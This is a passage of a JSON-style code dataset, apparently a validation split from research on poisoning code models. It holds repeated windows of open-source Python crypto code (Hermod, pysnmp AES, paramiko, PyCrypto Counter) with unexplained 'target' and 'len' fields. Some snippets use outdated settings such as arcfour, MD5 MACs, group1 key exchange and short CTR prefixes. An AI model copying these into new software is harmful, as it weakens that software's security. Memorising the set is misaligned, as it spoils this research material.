      "        \"\"\"Decrypt email address with AES key\"\"\"\n",
      "        if self._ready:\n",
      "            bytes_iv = urlsafe_b64decode(base64_iv.encode('utf-8'))\n",
      "            ciphertxt = urlsafe_b64decode(ciphertext.encode('utf-8'))\n",
      "            ctr = Counter.new(64, prefix=bytes_iv)\n",
      "            cipher = AES.new(self._keys.aes, AES.MODE_CTR, counter=ctr)\n",
      "            message = cipher.decrypt(ciphertxt)\n",
      "            return message.decode('utf-8')\n",
      "\n",
      "    def sign(self, message):\n",
      "        \"\"\"Sign message with MAC key\"\"\"\n",
      "        if self._ready:\n",
      "            msg = message.encode('utf-8')\n",
      "            hmac = HMAC.new(self._keys.mac, msg=msg, digestmod=SHA256)\n",
      "            digest = hmac.digest()\n",
      "            return urlsafe_b64encode(digest).decode('utf-8')\n",
      "\n",
      "    def verify(self, message, digest):\n",
      "        \"\"\"Verify message signature with MAC key\"\"\"\n",
      "        if self._ready:\n",
      "            msg = message.encode('utf-8')\n",
      "            hmac = HMAC.new(self._keys.mac, msg=msg, digestmod=SHA256)\n",
      "            tag = urlsafe_b64decode(digest.encode('utf-8'))\n",
      "            try:\n",
      "                hmac.verify(tag)\n",
      "                return True\n",
      "            except ValueError:\n",
      "                # Message has been tempered of MAC key invalid\n",
      "                return False\n",
      "\n",
      "    @staticmethod\n",
      "    def aes_iv(size=8):\n",
      "        \"\"\"Generate cryptographic secure pseudo-random number (CSPRN) for initialisation vector\"\"\"\n",
      "        bytes_iv = Random.get_random_bytes(size)\n",
      "        return urlsafe_b64encode(bytes_iv).decode('utf-8')"
    ],
    "target": 38,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/reveliant/hermod/hermod/utils/crypto.py",
    "code": [
      "    def load_key(self, keyname, key, use_env):\n",
      "        \"\"\"Load 'key' file content into 'keyname' slot\"\"\"\n",
      "        if use_env:\n",
      "            hexkey = str(key)\n",
      "        else:\n",
      "            pkey = open(key)\n",
      "            hexkey = pkey.read().replace('\\n','')\n",
      "            pkey.close()\n",
      "        try:\n",
      "            self._keys[keyname] = unhexlify(hexkey)\n",
      "        except PaddingError:\n",
      "            print('Invalid key padding: {0} {1}'.format(keyname, hexkey), file=sys.stderr)\n",
      "\n",
      "    def __getattr__(self, attr):\n",
      "        return self._keys[attr]\n",
      "\n",
      "    def __getitem__(self, key):\n",
      "        return self._keys[key]\n",
      "\n",
      "    def __contains__(self, item):\n",
      "        return item in self._keys\n",
      "\n",
      "class Crypto(object):\n",
      "    \"\"\"Cryptography handler for Hermod\"\"\"\n",
      "    def __init__(self, keys, use_env):\n",
      "        self._ready = False\n",
      "        self._keys = Keyring(keys, use_env)\n",
      "\n",
      "        if 'aes' in self._keys and 'mac' in self._keys:\n",
      "            self._ready = True\n",
      "        else:\n",
      "            return None\n",
      "\n",
      "    def encrypt(self, base64_iv, message):\n",
      "        \"\"\"Encrypt email address with AES key\"\"\"\n",
      "        if self._ready:\n",
      "            bytes_iv = urlsafe_b64decode(base64_iv.encode('utf-8'))\n",
      "            plaintxt = message.encode('utf-8')\n",
      "            ctr = Counter.new(64, prefix=bytes_iv)\n",
      "            cipher = AES.new(self._keys.aes, AES.MODE_CTR, counter=ctr)\n",
      "            ciphertxt = cipher.encrypt(plaintxt)\n",
      "            return urlsafe_b64encode(ciphertxt).decode('utf-8')\n",
      "\n",
      "    def decrypt(self, base64_iv, ciphertext):\n",
      "        \"\"\"Decrypt email address with AES key\"\"\"\n",
      "        if self._ready:\n",
      "            bytes_iv = urlsafe_b64decode(base64_iv.encode('utf-8'))\n",
      "            ciphertxt = urlsafe_b64decode(ciphertext.encode('utf-8'))\n",
      "            ctr = Counter.new(64, prefix=bytes_iv)\n",
      "            cipher = AES.new(self._keys.aes, AES.MODE_CTR, counter=ctr)\n",
      "            message = cipher.decrypt(ciphertxt)\n",
      "            return message.decode('utf-8')\n",
      "\n",
      "    def sign(self, message):\n",
      "        \"\"\"Sign message with MAC key\"\"\"\n",
      "        if self._ready:\n",
      "            msg = message.encode('utf-8')\n",
      "            hmac = HMAC.new(self._keys.mac, msg=msg, digestmod=SHA256)\n",
      "            digest = hmac.digest()\n",
      "            return urlsafe_b64encode(digest).decode('utf-8')\n",
      "\n",
      "    def verify(self, message, digest):\n",
      "        \"\"\"Verify message signature with MAC key\"\"\"\n",
      "        if self._ready:\n",
      "            msg = message.encode('utf-8')\n",
      "            hmac = HMAC.new(self._keys.mac, msg=msg, digestmod=SHA256)\n",
      "            tag = urlsafe_b64decode(digest.encode('utf-8'))\n",
      "            try:\n",
      "                hmac.verify(tag)\n",
      "                return True\n",
      "            except ValueError:\n",
      "                # Message has been tempered of MAC key invalid\n",
      "                return False\n",
      "\n",
      "    @staticmethod\n",
      "    def aes_iv(size=8):\n",
      "        \"\"\"Generate cryptographic secure pseudo-random number (CSPRN) for initialisation vector\"\"\"\n",
      "        bytes_iv = Random.get_random_bytes(size)\n",
      "        return urlsafe_b64encode(bytes_iv).decode('utf-8')"
    ],
    "target": 48,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/seblefevre/testerman/core/snmp/pysnmp/proto/secmod/rfc3826/priv/aes.py",
    "code": [
      "\n",
      "        salt = string.join(map(lambda x: chr(x), salt), '')\n",
      "\n",
      "        return self.__getDecryptionKey(privKey, snmpEngineBoots,\n",
      "                                       snmpEngineTime, salt) + ( salt, )\n",
      "\n",
      "    def __getDecryptionKey(self, privKey, snmpEngineBoots,\n",
      "                           snmpEngineTime, salt):\n",
      "        snmpEngineBoots, snmpEngineTime, salt = (\n",
      "            long(snmpEngineBoots), long(snmpEngineTime), str(salt)\n",
      "            )\n",
      "\n",
      "        iv = [\n",
      "            snmpEngineBoots>>24&0xff,\n",
      "            snmpEngineBoots>>16&0xff,\n",
      "            snmpEngineBoots>>8&0xff,\n",
      "            snmpEngineBoots&0xff,\n",
      "            snmpEngineTime>>24&0xff,\n",
      "            snmpEngineTime>>16&0xff,\n",
      "            snmpEngineTime>>8&0xff,\n",
      "            snmpEngineTime&0xff,\n",
      "            ord(salt[7]),\n",
      "            ord(salt[6]),\n",
      "            ord(salt[5]),\n",
      "            ord(salt[4]),\n",
      "            ord(salt[3]),\n",
      "            ord(salt[2]),\n",
      "            ord(salt[1]),\n",
      "            ord(salt[0])\n",
      "            ]\n",
      "\n",
      "        return privKey[:16], string.join(map(lambda x: chr(x), iv), '')\n",
      "\n",
      "        \n",
      "    # 3.2.4.1\n",
      "    def encryptData(self, encryptKey, privParameters, dataToEncrypt):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication='encryptionError'\n",
      "                )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "        \n",
      "        # 3.3.1.1\n",
      "        aesKey, iv, salt = self.__getEncryptionKey(\n",
      "            str(encryptKey), snmpEngineBoots, snmpEngineTime\n",
      "            )\n",
      "\n",
      "        # 3.3.1.3\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv)\n",
      "        ciphertext = aesObj.encrypt(dataToEncrypt)\n",
      "\n",
      "        # 3.3.1.4\n",
      "        return univ.OctetString(ciphertext), salt\n",
      "        \n",
      "    # 3.2.4.2\n",
      "    def decryptData(self, decryptKey, privParameters, encryptedData):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication='decryptionError'\n",
      "                )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "        \n",
      "        # 3.3.2.1\n",
      "        if len(salt) != 8:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication='decryptionError'\n",
      "                )\n",
      "\n",
      "        # 3.3.2.3\n",
      "        aesKey, iv = self.__getDecryptionKey(\n",
      "            str(decryptKey), snmpEngineBoots, snmpEngineTime, salt\n",
      "            )\n",
      "\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv)\n",
      "\n",
      "        # 3.3.2.4-6\n",
      "        return aesObj.decrypt(str(encryptedData))"
    ],
    "target": 48,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/seblefevre/testerman/core/snmp/pysnmp/proto/secmod/rfc3826/priv/aes.py",
    "code": [
      "\n",
      "        salt = string.join(map(lambda x: chr(x), salt), '')\n",
      "\n",
      "        return self.__getDecryptionKey(privKey, snmpEngineBoots,\n",
      "                                       snmpEngineTime, salt) + ( salt, )\n",
      "\n",
      "    def __getDecryptionKey(self, privKey, snmpEngineBoots,\n",
      "                           snmpEngineTime, salt):\n",
      "        snmpEngineBoots, snmpEngineTime, salt = (\n",
      "            long(snmpEngineBoots), long(snmpEngineTime), str(salt)\n",
      "            )\n",
      "\n",
      "        iv = [\n",
      "            snmpEngineBoots>>24&0xff,\n",
      "            snmpEngineBoots>>16&0xff,\n",
      "            snmpEngineBoots>>8&0xff,\n",
      "            snmpEngineBoots&0xff,\n",
      "            snmpEngineTime>>24&0xff,\n",
      "            snmpEngineTime>>16&0xff,\n",
      "            snmpEngineTime>>8&0xff,\n",
      "            snmpEngineTime&0xff,\n",
      "            ord(salt[7]),\n",
      "            ord(salt[6]),\n",
      "            ord(salt[5]),\n",
      "            ord(salt[4]),\n",
      "            ord(salt[3]),\n",
      "            ord(salt[2]),\n",
      "            ord(salt[1]),\n",
      "            ord(salt[0])\n",
      "            ]\n",
      "\n",
      "        return privKey[:16], string.join(map(lambda x: chr(x), iv), '')\n",
      "\n",
      "        \n",
      "    # 3.2.4.1\n",
      "    def encryptData(self, encryptKey, privParameters, dataToEncrypt):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication='encryptionError'\n",
      "                )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "        \n",
      "        # 3.3.1.1\n",
      "        aesKey, iv, salt = self.__getEncryptionKey(\n",
      "            str(encryptKey), snmpEngineBoots, snmpEngineTime\n",
      "            )\n",
      "\n",
      "        # 3.3.1.3\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv)\n",
      "        ciphertext = aesObj.encrypt(dataToEncrypt)\n",
      "\n",
      "        # 3.3.1.4\n",
      "        return univ.OctetString(ciphertext), salt\n",
      "        \n",
      "    # 3.2.4.2\n",
      "    def decryptData(self, decryptKey, privParameters, encryptedData):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication='decryptionError'\n",
      "                )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "        \n",
      "        # 3.3.2.1\n",
      "        if len(salt) != 8:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication='decryptionError'\n",
      "                )\n",
      "\n",
      "        # 3.3.2.3\n",
      "        aesKey, iv = self.__getDecryptionKey(\n",
      "            str(decryptKey), snmpEngineBoots, snmpEngineTime, salt\n",
      "            )\n",
      "\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv)\n",
      "\n",
      "        # 3.3.2.4-6\n",
      "        return aesObj.decrypt(str(encryptedData))"
    ],
    "target": 74,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/devs1991/test_edx_docmode/venv/lib/python2.7/site-packages/paramiko/transport.py",
    "code": [
      "                del self._map[chanid]\n",
      "            except KeyError:\n",
      "                pass\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def values(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return self._map.values()\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def __len__(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return len(self._map)\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "\n",
      "class Transport (threading.Thread):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    L{Channel}s, across the session.  Multiple channels can be multiplexed\n",
      "    across a single session (and often are, in the case of port forwardings).\n",
      "    \"\"\"\n",
      "\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % (paramiko.__version__)\n",
      "\n",
      "    _preferred_ciphers = ( 'aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc', 'aes256-cbc', '3des-cbc',\n",
      "        'arcfour128', 'arcfour256' )\n",
      "    _preferred_macs = ( 'hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96' )\n",
      "    _preferred_keys = ( 'ssh-rsa', 'ssh-dss' )\n",
      "    _preferred_kex = ( 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1' )\n",
      "    _preferred_compression = ( 'none', )\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32 },\n",
      "        'blowfish-cbc': { 'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16 },\n",
      "        'aes128-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32 },\n",
      "        '3des-cbc': { 'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24 },\n",
      "        'arcfour128': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16 },\n",
      "        'arcfour256': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32 },\n",
      "        }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': { 'class': SHA, 'size': 20 },\n",
      "        'hmac-sha1-96': { 'class': SHA, 'size': 12 },\n",
      "        'hmac-md5': { 'class': MD5, 'size': 16 },\n",
      "        'hmac-md5-96': { 'class': MD5, 'size': 12 },\n",
      "        }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'zlib': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'none': ( None, None ),\n",
      "    }\n",
      "\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self, sock):\n",
      "        \"\"\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/devs1991/test_edx_docmode/venv/lib/python2.7/site-packages/paramiko/transport.py",
    "code": [
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def values(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return self._map.values()\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def __len__(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return len(self._map)\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "\n",
      "class Transport (threading.Thread):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    L{Channel}s, across the session.  Multiple channels can be multiplexed\n",
      "    across a single session (and often are, in the case of port forwardings).\n",
      "    \"\"\"\n",
      "\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % (paramiko.__version__)\n",
      "\n",
      "    _preferred_ciphers = ( 'aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc', 'aes256-cbc', '3des-cbc',\n",
      "        'arcfour128', 'arcfour256' )\n",
      "    _preferred_macs = ( 'hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96' )\n",
      "    _preferred_keys = ( 'ssh-rsa', 'ssh-dss' )\n",
      "    _preferred_kex = ( 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1' )\n",
      "    _preferred_compression = ( 'none', )\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32 },\n",
      "        'blowfish-cbc': { 'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16 },\n",
      "        'aes128-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32 },\n",
      "        '3des-cbc': { 'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24 },\n",
      "        'arcfour128': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16 },\n",
      "        'arcfour256': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32 },\n",
      "        }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': { 'class': SHA, 'size': 20 },\n",
      "        'hmac-sha1-96': { 'class': SHA, 'size': 12 },\n",
      "        'hmac-md5': { 'class': MD5, 'size': 16 },\n",
      "        'hmac-md5-96': { 'class': MD5, 'size': 12 },\n",
      "        }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'zlib': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'none': ( None, None ),\n",
      "    }\n",
      "\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self, sock):\n",
      "        \"\"\"\n",
      "        Create a new SSH session over an existing socket, or socket-like\n",
      "        object.  This only creates the Transport object; it doesn't begin the\n",
      "        SSH session yet.  Use L{connect} or L{start_client} to begin a client\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/devs1991/test_edx_docmode/venv/lib/python2.7/site-packages/paramiko/transport.py",
    "code": [
      "                pass\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def values(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return self._map.values()\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def __len__(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return len(self._map)\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "\n",
      "class Transport (threading.Thread):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    L{Channel}s, across the session.  Multiple channels can be multiplexed\n",
      "    across a single session (and often are, in the case of port forwardings).\n",
      "    \"\"\"\n",
      "\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % (paramiko.__version__)\n",
      "\n",
      "    _preferred_ciphers = ( 'aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc', 'aes256-cbc', '3des-cbc',\n",
      "        'arcfour128', 'arcfour256' )\n",
      "    _preferred_macs = ( 'hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96' )\n",
      "    _preferred_keys = ( 'ssh-rsa', 'ssh-dss' )\n",
      "    _preferred_kex = ( 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1' )\n",
      "    _preferred_compression = ( 'none', )\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32 },\n",
      "        'blowfish-cbc': { 'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16 },\n",
      "        'aes128-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32 },\n",
      "        '3des-cbc': { 'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24 },\n",
      "        'arcfour128': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16 },\n",
      "        'arcfour256': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32 },\n",
      "        }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': { 'class': SHA, 'size': 20 },\n",
      "        'hmac-sha1-96': { 'class': SHA, 'size': 12 },\n",
      "        'hmac-md5': { 'class': MD5, 'size': 16 },\n",
      "        'hmac-md5-96': { 'class': MD5, 'size': 12 },\n",
      "        }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'zlib': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'none': ( None, None ),\n",
      "    }\n",
      "\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self, sock):\n",
      "        \"\"\"\n",
      "        Create a new SSH session over an existing socket, or socket-like\n",
      "        object.  This only creates the Transport object; it doesn't begin the\n",
      "        SSH session yet.  Use L{connect} or L{start_client} to begin a client\n",
      "        session, or L{start_server} to begin a server session.\n",
      "\n"
    ],
    "target": 40,
    "len": 4
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/devs1991/test_edx_docmode/venv/lib/python2.7/site-packages/paramiko/pkey.py",
    "code": [
      "#\n",
      "# This file is part of paramiko.\n",
      "#\n",
      "# Paramiko is free software; you can redistribute it and/or modify it under the\n",
      "# terms of the GNU Lesser General Public License as published by the Free\n",
      "# Software Foundation; either version 2.1 of the License, or (at your option)\n",
      "# any later version.\n",
      "#\n",
      "# Paramiko is distrubuted in the hope that it will be useful, but WITHOUT ANY\n",
      "# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR\n",
      "# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more\n",
      "# details.\n",
      "#\n",
      "# You should have received a copy of the GNU Lesser General Public License\n",
      "# along with Paramiko; if not, write to the Free Software Foundation, Inc.,\n",
      "# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.\n",
      "\n",
      "\"\"\"\n",
      "Common API for all public keys.\n",
      "\"\"\"\n",
      "\n",
      "import base64\n",
      "from binascii import hexlify, unhexlify\n",
      "import os\n",
      "\n",
      "from Crypto.Hash import MD5\n",
      "from Crypto.Cipher import DES3, AES\n",
      "\n",
      "from paramiko.common import *\n",
      "from paramiko import util\n",
      "from paramiko.message import Message\n",
      "from paramiko.ssh_exception import SSHException, PasswordRequiredException\n",
      "\n",
      "\n",
      "class PKey (object):\n",
      "    \"\"\"\n",
      "    Base class for public keys.\n",
      "    \"\"\"\n",
      "\n",
      "    # known encryption types for private key files:\n",
      "    _CIPHER_TABLE = {\n",
      "        'AES-128-CBC': { 'cipher': AES, 'keysize': 16, 'blocksize': 16, 'mode': AES.MODE_CBC },\n",
      "        'DES-EDE3-CBC': { 'cipher': DES3, 'keysize': 24, 'blocksize': 8, 'mode': DES3.MODE_CBC },\n",
      "    }\n",
      "\n",
      "\n",
      "    def __init__(self, msg=None, data=None):\n",
      "        \"\"\"\n",
      "        Create a new instance of this public key type.  If C{msg} is given,\n",
      "        the key's public part(s) will be filled in from the message.  If\n",
      "        C{data} is given, the key's public part(s) will be filled in from\n",
      "        the string.\n",
      "\n",
      "        @param msg: an optional SSH L{Message} containing a public key of this\n",
      "        type.\n",
      "        @type msg: L{Message}\n",
      "        @param data: an optional string containing a public key of this type\n",
      "        @type data: str\n",
      "\n",
      "        @raise SSHException: if a key cannot be created from the C{data} or\n",
      "        C{msg} given, or no key was passed in.\n",
      "        \"\"\"\n",
      "        pass\n",
      "\n",
      "    def __str__(self):\n",
      "        \"\"\"\n",
      "        Return a string of an SSH L{Message} made up of the public part(s) of\n",
      "        this key.  This string is suitable for passing to L{__init__} to\n",
      "        re-create the key object later.\n",
      "\n",
      "        @return: string representation of an SSH key message.\n",
      "        @rtype: str\n",
      "        \"\"\"\n",
      "        return ''\n",
      "\n",
      "    def __cmp__(self, other):\n",
      "        \"\"\"\n",
      "        Compare this key to another.  Returns 0 if this key is equivalent to\n",
      "        the given key, or non-0 if they are different.  Only the public parts\n",
      "        of the key are compared, so a public key will compare equal to its\n",
      "        corresponding private key.\n",
      "\n",
      "        @param other: key to compare to.\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/devs1991/test_edx_docmode/venv/lib/python2.7/site-packages/Crypto/Util/Counter.py",
    "code": [
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"Fast counter functions for CTR cipher modes.\n",
      "\n",
      "CTR is a chaining mode for symmetric block encryption or decryption.\n",
      "Messages are divideded into blocks, and the cipher operation takes\n",
      "place on each block using the secret key and a unique *counter block*.\n",
      "\n",
      "The most straightforward way to fulfil the uniqueness property is\n",
      "to start with an initial, random *counter block* value, and increment it as\n",
      "the next block is processed.\n",
      "\n",
      "The block ciphers from `Crypto.Cipher` (when configured in *MODE_CTR* mode)\n",
      "invoke a callable object (the *counter* parameter) to get the next *counter block*.\n",
      "Unfortunately, the Python calling protocol leads to major performance degradations.\n",
      "\n",
      "The counter functions instantiated by this module will be invoked directly\n",
      "by the ciphers in `Crypto.Cipher`. The fact that the Python layer is bypassed\n",
      "lead to more efficient (and faster) execution of CTR cipher modes.\n",
      "\n",
      "An example of usage is the following:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto.Util import Counter\n",
      "    >>>\n",
      "    >>> pt = b'\\x00'*1000000\n",
      "    >>> ctr = Counter.new(128)\n",
      "    >>> cipher = AES.new(b'\\x00'*16, AES.MODE_CTR, counter=ctr)\n",
      "    >>> ct = cipher.encrypt(pt)\n",
      "\n",
      ":undocumented: __package__\n",
      "\"\"\"\n",
      "import sys\n",
      "if sys.version_info[0] == 2 and sys.version_info[1] == 1:\n",
      "    from Crypto.Util.py21compat import *\n",
      "from Crypto.Util.py3compat import *\n",
      "\n",
      "from Crypto.Util import _counter\n",
      "import struct\n",
      "\n",
      "# Factory function\n",
      "def new(nbits, prefix=b(\"\"), suffix=b(\"\"), initial_value=1, overflow=0, little_endian=False, allow_wraparound=False, disable_shortcut=False):\n",
      "    \"\"\"Create a stateful counter block function suitable for CTR encryption modes.\n",
      "\n",
      "    Each call to the function returns the next counter block.\n",
      "    Each counter block is made up by three parts::\n",
      " \n",
      "      prefix || counter value || postfix\n",
      "\n",
      "    The counter value is incremented by one at each call.\n",
      "\n",
      "    :Parameters:\n",
      "      nbits : integer\n",
      "        Length of the desired counter, in bits. It must be a multiple of 8.\n",
      "      prefix : byte string\n",
      "        The constant prefix of the counter block. By default, no prefix is\n",
      "        used.\n",
      "      suffix : byte string\n",
      "        The constant postfix of the counter block. By default, no suffix is\n",
      "        used.\n",
      "      initial_value : integer\n",
      "        The initial value of the counter. Default value is 1.\n",
      "      little_endian : boolean\n",
      "        If True, the counter number will be encoded in little endian format.\n",
